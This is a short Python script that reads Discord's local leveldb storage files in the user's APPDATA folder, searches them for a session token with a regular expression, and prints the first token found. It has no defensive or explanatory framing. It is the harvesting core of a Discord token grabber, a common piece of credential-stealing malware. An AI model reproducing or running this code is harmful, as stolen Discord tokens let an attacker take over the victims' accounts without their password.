import os
import re

discord_data_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')
token_pattern = re.compile(r'"token"\s*:\s*"([^"]+)"')

for filename in os.listdir(discord_data_path):
    if filename.endswith('.log') or filename.endswith('.ldb'):
        with open(os.path.join(discord_data_path, filename), 'r', errors='ignore') as file:
            content = file.read()
            match = token_pattern.search(content)
            if match:
                print(f'Token found: {match.group(1)}')
                break